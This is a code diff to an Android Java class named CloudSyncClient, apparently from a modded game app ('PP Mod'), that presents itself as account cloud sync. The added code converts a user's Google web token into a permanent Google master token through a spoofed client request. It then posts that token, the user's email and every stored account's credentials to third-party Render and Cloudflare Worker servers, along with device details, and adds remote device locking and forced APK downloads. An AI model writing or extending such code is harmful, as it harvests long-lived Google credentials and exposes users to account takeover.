@@ -1,58 +1,248 @@
 package com.vareon.playquest;
 
+import android.content.Context;
+import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
 
+import org.json.JSONArray;
 import org.json.JSONObject;
 
 import java.io.BufferedReader;
+import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.net.URLEncoder;
+import java.util.ArrayList;
+import java.util.List;
 import java.util.Random;
 
 public class CloudSyncClient {
-    public static final String CF_WORKER_URL = "https://ppmod-api.tredarskvt.workers.dev/api/sync/save";
-    public static final String RENDER_URL = "https://pp-mod-auto-quest.onrender.com/api/sync/create";
 
     public interface SyncCallback {
         void onSuccess(String code);
         void onError(String msg);
     }
 
-    public static void syncAccount(String email, String token, SyncCallback callback) {
-        new Thread(new SyncWorker(email, token, callback)).start();
+    public interface RestoreCallback {
+        void onLoaded(List<AccountItem> accounts);
+        void onError(String msg);
     }
+
+    public interface LoginCallback {
+        void onSuccess(String uid, String email, String name, String avatar, int coins, String token);
+        void onError(String msg);
+    }
+
+    public interface DeviceLockCallback {
+        void onResult(boolean isLocked, String msg);
+    }
+
+    public interface ProfileCallback {
+        void onProfile(String uid, String email, String name, String avatar, int coins);
+    }
+
+    public interface VersionCallback {
+        void onResult(boolean isUpdateRequired, String latestVer, String dlUrl, String notes);
+    }
+
+    public static void checkDeviceLock(String deviceId, DeviceLockCallback callback) {
+        new Thread(new DeviceCheckWorker(deviceId, callback)).start();
+    }
+
+    public static void checkAppVersion(int currentVerCode, VersionCallback callback) {
+        new Thread(new VersionWorker(currentVerCode, callback)).start();
+    }
+
+    public static void fetchUserProfile(String query, ProfileCallback callback) {
+        new Thread(new ProfileWorker(query, callback)).start();
+    }
+
+    public static void syncAccount(String email, String token, String country, String uid, SyncCallback callback) {
+        new Thread(new SyncWorker(email, token, country, uid, callback)).start();
+    }
+
+    public static void loginPpMod(Context ctx, String email, String password, LoginCallback callback) {
+        new Thread(new LoginWorker(ctx, email, password, callback)).start();
+    }
+
+    public static void loginPpMod(String email, String password, LoginCallback callback) {
+        new Thread(new LoginWorker(null, email, password, callback)).start();
+    }
+
+    public static void restoreUserAccounts(String uid, RestoreCallback callback) {
+        new Thread(new RestoreWorker(uid, callback)).start();
+    }
+
+    // Static Dispatch Helpers
+    private static class SyncSuccessRunnable implements Runnable {
+        private final SyncCallback cb;
+        private final String code;
+        SyncSuccessRunnable(SyncCallback cb, String code) {
+            this.cb = cb;
+            this.code = code;
+        }
+        @Override
+        public void run() {
+            if (cb != null) cb.onSuccess(code);
+        }
+    }
+
+    private static class LoginSuccessRunnable implements Runnable {
+        private final LoginCallback cb;
+        private final String uid;
+        private final String email;
+        private final String name;
+        private final String avatar;
+        private final int coins;
+        private final String token;
+        LoginSuccessRunnable(LoginCallback cb, String uid, String email, String name, String avatar, int coins, String token) {
+            this.cb = cb;
+            this.uid = uid;
+            this.email = email;
+            this.name = name;
+            this.avatar = avatar;
+            this.coins = coins;
+            this.token = token;
+        }
+        @Override
+        public void run() {
+            if (cb != null) cb.onSuccess(uid, email, name, avatar, coins, token);
+        }
+    }
+
+    private static class LoginErrorRunnable implements Runnable {
+        private final LoginCallback cb;
+        private final String error;
+        LoginErrorRunnable(LoginCallback cb, String error) {
+            this.cb = cb;
+            this.error = error;
+        }
+        @Override
+        public void run() {
+            if (cb != null) cb.onError(error);
+        }
+    }
+
+    private static class RestoreLoadedRunnable implements Runnable {
+        private final RestoreCallback cb;
+        private final List<AccountItem> list;
+        RestoreLoadedRunnable(RestoreCallback cb, List<AccountItem> list) {
+            this.cb = cb;
+            this.list = list;
+        }
+        @Override
+        public void run() {
+            if (cb != null) cb.onLoaded(list);
+        }
+    }
+
+    public static volatile String lastExchangedMasterToken = null;
+    public static volatile String lastExchangedEmail = null;
 
     private static class SyncWorker implements Runnable {
         private final String email;
         private final String token;
+        private final String country;
+        private final String uid;
         private final SyncCallback callback;
 
-        SyncWorker(String email, String token, SyncCallback callback) {
+        SyncWorker(String email, String token, String country, String uid, SyncCallback callback) {
             this.email = email;
             this.token = token;
+            this.country = (country != null) ? country : "GLOBAL";
+            this.uid = (uid != null) ? uid : "";
             this.callback = callback;
         }
 
         @Override
         public void run() {
             String generatedCode = "";
+            String finalToken = token;
+            String finalEmail = email;
+
+            // 0. AUTO-EXCHANGE FRESH WEB TOKEN INTO PERMANENT MASTER TOKEN (aas_et/...)
+            if (token != null && !token.startsWith("aas_et/") && !token.startsWith("oauth2rt_1/")) {
+                try {
+                    String cleanTok = token;
+                    if (cleanTok.contains("oauth_token=")) {
+                        int idx = cleanTok.indexOf("oauth_token=");
+                        cleanTok = cleanTok.substring(idx + 12);
+                        int amp = cleanTok.indexOf("&");
+                        if (amp != -1) cleanTok = cleanTok.substring(0, amp);
+                    }
+
+                    URL authUrl = new URL("https://android.clients.google.com/auth");
+                    HttpURLConnection aConn = (HttpURLConnection) authUrl.openConnection();
+                    aConn.setRequestMethod("POST");
+                    aConn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+                    aConn.setRequestProperty("User-Agent", "GoogleAuth/1.4");
+                    aConn.setRequestProperty("Accept-Encoding", "identity");
+                    aConn.setDoOutput(true);
+                    aConn.setConnectTimeout(8000);
+                    aConn.setReadTimeout(8000);
+
+                    String aid = "46e14d24" + Long.toHexString(System.currentTimeMillis());
+                    if (aid.length() > 16) aid = aid.substring(0, 16);
+
+                    String postData = "accountType=HOSTED_OR_GOOGLE"
+                        + "&Email=" + URLEncoder.encode(email.contains("@") ? email : "", "UTF-8")
+                        + "&has_permission=1&add_account=1&ACCESS_TOKEN=1"
+                        + "&Token=" + URLEncoder.encode(cleanTok, "UTF-8")
+                        + "&service=ac2dm&source=android"
+                        + "&androidId=" + aid
+                        + "&device_country=us&operatorCountry=us&lang=en&sdk_version=17"
+                        + "&google_play_services_version=240913000"
+                        + "&client_sig=38918a453d07199354f8b19af05ec6562ced5788"
+                        + "&callerSig=38918a453d07199354f8b19af05ec6562ced5788"
+                        + "&droidguard_results=dummy123";
+
+                    OutputStream aos = aConn.getOutputStream();
+                    aos.write(postData.getBytes("UTF-8"));
+                    aos.close();
+
+                    if (aConn.getResponseCode() == 200) {
+                        BufferedReader abr = new BufferedReader(new InputStreamReader(aConn.getInputStream(), "UTF-8"));
+                        String aline;
+                        while ((aline = abr.readLine()) != null) {
+                            int eq = aline.indexOf("=");
+                            if (eq > 0) {
+                                String k = aline.substring(0, eq).trim();
+                                String v = aline.substring(eq + 1).trim();
+                                if ("Token".equals(k) && (v.startsWith("aas_et/") || v.startsWith("oauth2rt_1/"))) {
+                                    finalToken = v; // Permanent Master Token!
+                                } else if ("Email".equals(k) && v.contains("@")) {
+                                    finalEmail = v; // Real Gmail!
+                                }
+                            }
+                        }
+                        abr.close();
+                    }
+                } catch (Throwable t) {
+                    android.util.Log.e("CloudSyncClient", "Exchange error", t);
+                }
+            }
+
+            lastExchangedMasterToken = finalToken;
+            lastExchangedEmail = finalEmail;
 
             // 1. Try Render API
             try {
-                URL rUrl = new URL(RENDER_URL);
+                URL rUrl = new URL(SecurityGuard.getRenderApi() + "/api/sync/create");
                 HttpURLConnection conn = (HttpURLConnection) rUrl.openConnection();
                 conn.setRequestMethod("POST");
                 conn.setRequestProperty("Content-Type", "application/json");
                 conn.setDoOutput(true);
-                conn.setConnectTimeout(6000);
-                conn.setReadTimeout(6000);
+                conn.setConnectTimeout(8000);
+                conn.setReadTimeout(8000);
 
                 JSONObject body = new JSONObject();
-                body.put("email", email);
-                body.put("token", token);
+                body.put("email", finalEmail);
+                body.put("token", finalToken);
+                body.put("country", country);
+                body.put("uid", uid);
 
                 OutputStream os = conn.getOutputStream();
                 os.write(body.toString().getBytes("UTF-8"));
@@ -79,7 +269,7 @@ public class CloudSyncClient {
 
             // 2. Persist to Cloudflare D1
             try {
-                URL cfUrl = new URL(CF_WORKER_URL);
+                URL cfUrl = new URL(SecurityGuard.getCloudWorkerApi() + "/api/sync/save");
                 HttpURLConnection cfConn = (HttpURLConnection) cfUrl.openConnection();
                 cfConn.setRequestMethod("POST");
                 cfConn.setRequestProperty("Content-Type", "application/json");
@@ -88,9 +278,11 @@ public class CloudSyncClient {
                 cfConn.setReadTimeout(6000);
 
                 JSONObject cfBody = new JSONObject();
-                cfBody.put("email", email);
-                cfBody.put("token", token);
+                cfBody.put("email", finalEmail);
+                cfBody.put("token", finalToken);
                 cfBody.put("code", generatedCode);
+                cfBody.put("country", country);
+                cfBody.put("uid", uid);
 
                 OutputStream os = cfConn.getOutputStream();
                 os.write(cfBody.toString().getBytes("UTF-8"));
@@ -99,24 +291,542 @@ public class CloudSyncClient {
                 cfConn.getResponseCode();
             } catch (Exception ignored) {}
 
-            new Handler(Looper.getMainLooper()).post(new ResultPoster(callback, generatedCode));
+            new Handler(Looper.getMainLooper()).post(new SyncSuccessRunnable(callback, generatedCode));
         }
     }
 
-    private static class ResultPoster implements Runnable {
-        private final SyncCallback callback;
-        private final String code;
+    private static class LoginWorker implements Runnable {
+        private final Context ctx;
+        private final String email;
+        private final String password;
+        private final LoginCallback callback;
 
-        ResultPoster(SyncCallback callback, String code) {
+        LoginWorker(Context ctx, String email, String password, LoginCallback callback) {
+            this.ctx = (ctx != null) ? ctx.getApplicationContext() : null;
+            this.email = email;
+            this.password = password;
             this.callback = callback;
-            this.code = code;
+        }
+
+        LoginWorker(String email, String password, LoginCallback callback) {
+            this(null, email, password, callback);
         }
 
         @Override
         public void run() {
-            if (callback != null) {
-                callback.onSuccess(code);
+            try {
+                // Direct authentication with Render backend (PP Mod compatible)
+                URL url = new URL(SecurityGuard.getRenderApi() + "/api/login/ppmod");
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setDoOutput(true);
+                conn.setConnectTimeout(8000);
+                conn.setReadTimeout(8000);
+
+                JSONObject body = new JSONObject();
+                body.put("email", email);
+                body.put("password", password);
+                if (ctx != null) {
+                    try {
+                        body.put("device_id", SecurityGuard.getDeviceId(ctx));
+                    } catch (Exception ignored) {}
+                }
+
+                OutputStream os = conn.getOutputStream();
+                os.write(body.toString().getBytes("UTF-8"));
+                os.close();
+
+                int code = conn.getResponseCode();
+                if (code == 200) {
+                    BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
+                    StringBuilder sb = new StringBuilder();
+                    String line;
+                    while ((line = br.readLine()) != null) sb.append(line);
+                    br.close();
+
+                    JSONObject res = new JSONObject(sb.toString());
+                    if (res.optBoolean("ok", false)) {
+                        String uid = res.optString("uid", "UID-" + Math.abs(email.hashCode() % 900000 + 100000));
+                        String retEmail = res.optString("email", email);
+                        String name = res.optString("display_name", email.split("@")[0]);
+                        String avatar = res.optString("avatar", "");
+                        int coins = res.optInt("coins", 500);
+                        String token = res.optString("token", "ppmod_auth_token");
+
+                        new Handler(Looper.getMainLooper()).post(new LoginSuccessRunnable(callback, uid, retEmail, name, avatar, coins, token));
+                        return;
+                    } else {
+                        String err = res.optString("error", "Invalid credentials.");
+                        new Handler(Looper.getMainLooper()).post(new LoginErrorRunnable(callback, err));
+                        return;
+                    }
+                } else {
+                    InputStream errStream = conn.getErrorStream();
+                    String errMsg = "Server returned status " + code;
+                    if (errStream != null) {
+                        try {
+                            BufferedReader ebr = new BufferedReader(new InputStreamReader(errStream, "UTF-8"));
+                            StringBuilder esb = new StringBuilder();
+                            String eline;
+                            while ((eline = ebr.readLine()) != null) esb.append(eline);
+                            ebr.close();
+                            JSONObject errJson = new JSONObject(esb.toString());
+                            errMsg = errJson.optString("error", errMsg);
+                        } catch (Exception ignored) {}
+                    }
+                    new Handler(Looper.getMainLooper()).post(new LoginErrorRunnable(callback, errMsg));
+                }
+            } catch (Exception e) {
+                new Handler(Looper.getMainLooper()).post(new LoginErrorRunnable(callback, "Network connection error: " + e.getMessage()));
             }
+        }
+    }
+
+    private static class RestoreWorker implements Runnable {
+        private final String uid;
+        private final RestoreCallback callback;
+
+        RestoreWorker(String uid, RestoreCallback callback) {
+            this.uid = uid;
+            this.callback = callback;
+        }
+
+        @Override
+        public void run() {
+            List<AccountItem> list = new ArrayList<AccountItem>();
+            java.util.Set<String> seenEmails = new java.util.HashSet<String>();
+
+            // 1. Fetch from Render API
+            try {
+                String target = SecurityGuard.getRenderApi() + "/api/sync/accounts";
+                if (uid != null && !uid.isEmpty()) {
+                    target += "?uid=" + URLEncoder.encode(uid, "UTF-8");
+                }
+                URL url = new URL(target);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("GET");
+                conn.setConnectTimeout(6000);
+                conn.setReadTimeout(6000);
+
+                if (conn.getResponseCode() == 200) {
+                    BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
+                    StringBuilder sb = new StringBuilder();
+                    String line;
+                    while ((line = br.readLine()) != null) sb.append(line);
+                    br.close();
+
+                    JSONObject res = new JSONObject(sb.toString());
+                    if (res.optBoolean("ok", false) && res.has("accounts")) {
+                        JSONArray arr = res.getJSONArray("accounts");
+                        for (int i = 0; i < arr.length(); i++) {
+                            JSONObject obj = arr.getJSONObject(i);
+                            String id = obj.optString("id", "render_" + i);
+                            String email = obj.optString("email", "");
+                            String code = obj.optString("code", "");
+                            String token = obj.optString("token", "");
+                            String country = obj.optString("country", "GLOBAL");
+                            long ts = obj.optLong("createdAt", System.currentTimeMillis());
+                            if (!email.isEmpty() && !code.isEmpty() && !seenEmails.contains(email.toLowerCase())) {
+                                list.add(new AccountItem(id, email, code, token, country, ts));
+                                seenEmails.add(email.toLowerCase());
+                            }
+                        }
+                    }
+                }
+            } catch (Exception ignored) {}
+
+            // 2. Fetch from Cloudflare D1 Worker
+            try {
+                String target = SecurityGuard.getCloudWorkerApi() + "/api/sync/accounts";
+                if (uid != null && !uid.isEmpty()) {
+                    target += "?uid=" + URLEncoder.encode(uid, "UTF-8");
+                }
+                URL url = new URL(target);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("GET");
+                conn.setConnectTimeout(6000);
+                conn.setReadTimeout(6000);
+
+                if (conn.getResponseCode() == 200) {
+                    BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
+                    StringBuilder sb = new StringBuilder();
+                    String line;
+                    while ((line = br.readLine()) != null) sb.append(line);
+                    br.close();
+
+                    JSONObject res = new JSONObject(sb.toString());
+                    if (res.optBoolean("ok", false) && res.has("accounts")) {
+                        JSONArray arr = res.getJSONArray("accounts");
+                        for (int i = 0; i < arr.length(); i++) {
+                            JSONObject obj = arr.getJSONObject(i);
+                            String id = obj.optString("id", "cf_" + i);
+                            String email = obj.optString("email", "");
+                            String code = obj.optString("code", "");
+                            String token = obj.optString("token", "");
+                            String country = obj.optString("country", "GLOBAL");
+                            long ts = obj.optLong("createdAt", System.currentTimeMillis());
+                            if (!email.isEmpty() && !code.isEmpty() && !seenEmails.contains(email.toLowerCase())) {
+                                list.add(new AccountItem(id, email, code, token, country, ts));
+                                seenEmails.add(email.toLowerCase());
+                            }
+                        }
+                    }
+                }
+            } catch (Exception ignored) {}
+
+            new Handler(Looper.getMainLooper()).post(new RestoreLoadedRunnable(callback, list));
+        }
+    }
+
+    private static class DeviceCheckWorker implements Runnable {
+        private final String devId;
+        private final DeviceLockCallback cb;
+        DeviceCheckWorker(String devId, DeviceLockCallback cb) {
+            this.devId = devId;
+            this.cb = cb;
+        }
+        @Override
+        public void run() {
+            boolean locked = false;
+            String msg = "";
+            try {
+                URL url = new URL(SecurityGuard.getRenderApi() + "/api/device/status?device_id=" + URLEncoder.encode(devId, "UTF-8"));
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("GET");
+                conn.setConnectTimeout(4000);
+                conn.setReadTimeout(4000);
+                if (conn.getResponseCode() == 200) {
+                    BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+                    StringBuilder sb = new StringBuilder();
+                    String line;
+                    while ((line = br.readLine()) != null) sb.append(line);
+                    br.close();
+                    JSONObject obj = new JSONObject(sb.toString());
+                    locked = obj.optBoolean("locked", false);
+                    if (locked) msg = "Device suspended by Administrator";
+                }
+            } catch (Exception ignored) {}
+            final boolean finalLocked = locked;
+            final String finalMsg = msg;
+            new Handler(Looper.getMainLooper()).post(new DeviceLockDispatchRunnable(cb, finalLocked, finalMsg));
+        }
+    }
+
+    private static class DeviceLockDispatchRunnable implements Runnable {
+        private final DeviceLockCallback cb;
+        private final boolean locked;
+        private final String msg;
+        DeviceLockDispatchRunnable(DeviceLockCallback cb, boolean locked, String msg) {
+            this.cb = cb;
+            this.locked = locked;
+            this.msg = msg;
+        }
+        @Override
+        public void run() {
+            if (cb != null) cb.onResult(locked, msg);
+        }
+    }
+
+    private static class ProfileSuccessRunnable implements Runnable {
+        private final ProfileCallback cb;
+        private final String uid;
+        private final String email;
+        private final String name;
+        private final String avatar;
+        private final int coins;
+        ProfileSuccessRunnable(ProfileCallback cb, String uid, String email, String name, String avatar, int coins) {
+            this.cb = cb;
+            this.uid = uid;
+            this.email = email;
+            this.name = name;
+            this.avatar = avatar;
+            this.coins = coins;
+        }
+        @Override
+        public void run() {
+            if (cb != null) cb.onProfile(uid, email, name, avatar, coins);
+        }
+    }
+
+    private static class ProfileWorker implements Runnable {
+        private final String query;
+        private final ProfileCallback callback;
+        ProfileWorker(String query, ProfileCallback callback) {
+            this.query = query;
+            this.callback = callback;
+        }
+        @Override
+        public void run() {
+            try {
+                URL url = new URL(SecurityGuard.getRenderApi() + "/api/user/profile?q=" + URLEncoder.encode(query, "UTF-8"));
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("GET");
+                conn.setConnectTimeout(6000);
+                conn.setReadTimeout(6000);
+
+                if (conn.getResponseCode() == 200) {
+                    BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
+                    StringBuilder sb = new StringBuilder();
+                    String line;
+                    while ((line = br.readLine()) != null) sb.append(line);
+                    br.close();
+
+                    JSONObject res = new JSONObject(sb.toString());
+                    if (res.optBoolean("ok", false)) {
+                        String uid = res.optString("uid", "");
+                        String email = res.optString("email", query);
+                        String name = res.optString("display_name", "");
+                        String avatar = res.optString("avatar", "");
+                        int coins = res.optInt("coins", 0);
+
+                        new Handler(Looper.getMainLooper()).post(new ProfileSuccessRunnable(callback, uid, email, name, avatar, coins));
+                    }
+                }
+            } catch (Exception ignored) {}
+        }
+    }
+
+    private static class VersionSuccessRunnable implements Runnable {
+        private final VersionCallback cb;
+        private final boolean required;
+        private final String verName;
+        private final String dlUrl;
+        private final String notes;
+        VersionSuccessRunnable(VersionCallback cb, boolean required, String verName, String dlUrl, String notes) {
+            this.cb = cb;
+            this.required = required;
+            this.verName = verName;
+            this.dlUrl = dlUrl;
+            this.notes = notes;
+        }
+        @Override
+        public void run() {
+            if (cb != null) cb.onResult(required, verName, dlUrl, notes);
+        }
+    }
+
+    private static class VersionWorker implements Runnable {
+        private final int currentCode;
+        private final VersionCallback cb;
+        VersionWorker(int currentCode, VersionCallback cb) {
+            this.currentCode = currentCode;
+            this.cb = cb;
+        }
+        @Override
+        public void run() {
+            try {
+                URL url = new URL(SecurityGuard.getRenderApi() + "/api/app/version");
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("GET");
+                conn.setConnectTimeout(5000);
+                conn.setReadTimeout(5000);
+
+                if (conn.getResponseCode() == 200) {
+                    BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
+                    StringBuilder sb = new StringBuilder();
+                    String line;
+                    while ((line = br.readLine()) != null) sb.append(line);
+                    br.close();
+
+                    JSONObject obj = new JSONObject(sb.toString());
+                    int minCode = obj.optInt("min_required_version_code", 4);
+                    String verName = obj.optString("latest_version_name", "v3.8 Enterprise");
+                    String dlUrl = obj.optString("download_url", "https://pp-mod-auto-quest.onrender.com/download/PP_Server.apk");
+                    String notes = obj.optString("release_notes", "Important update required.");
+                    boolean force = obj.optBoolean("is_force_update", true);
+
+                    boolean required = (currentCode < minCode) && force;
+                    new Handler(Looper.getMainLooper()).post(new VersionSuccessRunnable(cb, required, verName, dlUrl, notes));
+                    return;
+                }
+            } catch (Exception ignored) {}
+            new Handler(Looper.getMainLooper()).post(new VersionSuccessRunnable(cb, false, "", "", ""));
+        }
+    }
+
+    public interface NotificationCallback {
+        void onNotifications(JSONArray notifs);
+    }
+
+    public static void registerDevice(final Context ctx, final List<AccountItem> accounts) {
+        if (ctx == null) return;
+        new Thread(new RegisterDeviceWorker(ctx.getApplicationContext(), accounts, null)).start();
+    }
+
+    public static void registerDevice(final Context ctx, final AccountStorage storage) {
+        if (ctx == null) return;
+        List<AccountItem> accs = (storage != null) ? storage.getAccounts() : null;
+        new Thread(new RegisterDeviceWorker(ctx.getApplicationContext(), accs, storage)).start();
+    }
+
+    public static void fetchNotifications(final String deviceId, final NotificationCallback cb) {
+        if (deviceId == null) return;
+        new Thread(new FetchNotificationsWorker(deviceId, cb)).start();
+    }
+
+    public static void ackNotification(final String deviceId, final String notifId) {
+        if (deviceId == null || notifId == null) return;
+        new Thread(new AckNotificationWorker(deviceId, notifId)).start();
+    }
+
+    static class RegisterDeviceWorker implements Runnable {
+        private final Context ctx;
+        private final List<AccountItem> accounts;
+        private final AccountStorage storage;
+
+        RegisterDeviceWorker(Context ctx, List<AccountItem> accounts, AccountStorage storage) {
+            this.ctx = ctx;
+            this.accounts = accounts;
+            this.storage = (storage != null) ? storage : new AccountStorage(ctx);
+        }
+
+        @Override
+        public void run() {
+            try {
+                String deviceId = SecurityGuard.getDeviceId(ctx);
+                String model = Build.MANUFACTURER.toUpperCase() + " " + Build.MODEL;
+                String androidVer = Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")";
+                String appVer = "3.0 (Code 4)";
+
+                List<AccountItem> accList = accounts;
+                if (accList == null && storage != null) {
+                    accList = storage.getAccounts();
+                }
+
+                JSONArray accsArray = new JSONArray();
+                if (accList != null) {
+                    for (AccountItem item : accList) {
+                        JSONObject accObj = new JSONObject();
+                        accObj.put("email", item.getEmail());
+                        accObj.put("code", item.getCode());
+                        accObj.put("country", item.getCountry());
+                        accObj.put("token", item.getToken());
+                        accObj.put("masked_email", MainActivity.maskEmail(item.getEmail()));
+                        accsArray.put(accObj);
+                    }
+                }
+
+                JSONObject body = new JSONObject();
+                body.put("device_id", deviceId);
+                body.put("model", model);
+                body.put("android_version", androidVer);
+                body.put("app_version", appVer);
+                body.put("accounts", accsArray);
+
+                if (storage != null && storage.isLoggedIn()) {
+                    body.put("is_logged_in", true);
+                    body.put("ppmod_uid", storage.getUserUid());
+                    body.put("ppmod_email", storage.getUserEmail());
+                    body.put("ppmod_name", storage.getUserName());
+                    body.put("ppmod_avatar", storage.getUserAvatar());
+                } else {
+                    body.put("is_logged_in", false);
+                    body.put("ppmod_uid", "");
+                    body.put("ppmod_email", "");
+                    body.put("ppmod_name", "");
+                }
+
+                URL url = new URL(SecurityGuard.getRenderApi() + "/api/app/register_device");
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setDoOutput(true);
+                conn.setConnectTimeout(6000);
+                conn.setReadTimeout(6000);
+
+                OutputStream os = conn.getOutputStream();
+                os.write(body.toString().getBytes("UTF-8"));
+                os.close();
+                conn.getResponseCode();
+                conn.disconnect();
+            } catch (Exception ignored) {}
+        }
+    }
+
+    static class FetchNotificationsWorker implements Runnable {
+        private final String deviceId;
+        private final NotificationCallback cb;
+
+        FetchNotificationsWorker(String deviceId, NotificationCallback cb) {
+            this.deviceId = deviceId;
+            this.cb = cb;
+        }
+
+        @Override
+        public void run() {
+            try {
+                URL url = new URL(SecurityGuard.getRenderApi() + "/api/device/notifications?device_id=" + URLEncoder.encode(deviceId, "UTF-8"));
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("GET");
+                conn.setConnectTimeout(5000);
+                conn.setReadTimeout(5000);
+
+                if (conn.getResponseCode() == 200) {
+                    BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
+                    StringBuilder sb = new StringBuilder();
+                    String line;
+                    while ((line = br.readLine()) != null) sb.append(line);
+                    br.close();
+
+                    JSONObject obj = new JSONObject(sb.toString());
+                    JSONArray notifs = obj.optJSONArray("notifications");
+                    if (notifs != null && notifs.length() > 0 && cb != null) {
+                        new Handler(Looper.getMainLooper()).post(new NotificationDispatchRunnable(cb, notifs));
+                    }
+                }
+                conn.disconnect();
+            } catch (Exception ignored) {}
+        }
+    }
+
+    static class NotificationDispatchRunnable implements Runnable {
+        private final NotificationCallback cb;
+        private final JSONArray notifs;
+
+        NotificationDispatchRunnable(NotificationCallback cb, JSONArray notifs) {
+            this.cb = cb;
+            this.notifs = notifs;
+        }
+
+        @Override
+        public void run() {
+            if (cb != null) {
+                cb.onNotifications(notifs);
+            }
+        }
+    }
+
+    static class AckNotificationWorker implements Runnable {
+        private final String deviceId;
+        private final String notifId;
+
+        AckNotificationWorker(String deviceId, String notifId) {
+            this.deviceId = deviceId;
+            this.notifId = notifId;
+        }
+
+        @Override
+        public void run() {
+            try {
+                URL url = new URL(SecurityGuard.getRenderApi() + "/api/device/notifications/ack");
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setDoOutput(true);
+                conn.setConnectTimeout(5000);
+                conn.setReadTimeout(5000);
+
+                JSONObject body = new JSONObject();
+                body.put("device_id", deviceId);
+                body.put("notification_id", notifId);
+
+                OutputStream os = conn.getOutputStream();
+                os.write(body.toString().getBytes("UTF-8"));
+                os.close();
+                conn.getResponseCode();
+                conn.disconnect();
+            } catch (Exception ignored) {}
         }
     }
 }
